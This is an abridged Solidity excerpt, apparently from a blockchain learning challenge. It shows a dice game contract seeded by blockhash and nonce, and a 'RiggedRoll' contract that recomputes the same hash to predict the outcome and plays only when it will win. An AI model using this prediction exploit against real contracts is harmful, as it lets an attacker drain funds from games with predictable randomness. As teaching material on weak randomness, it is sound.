...
contract DiceGame {
    ...
    function rollTheDice() public payable {
        console.log("Rolling the dice with nonce: ", nonce);
        ...
        console.log("THE ACTUAL ROLL IS ",roll);
...
contract RiggedRoll is Ownable {
    ...
    function withdraw(address payable _addr, uint256 _amount) public onlyOwner {
        ...
        require(_addr != address(0), "Address must not be 0");
    ...
    function riggedRoll() public {
        ...
        uint256 copiedNonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), copiedNonce)
        );
        uint256 roll = uint256(hash) % 16;
        ...
        if (roll > 2) {
            ...
            console.log("Calling rollDice with nonce:", copiedNonce);
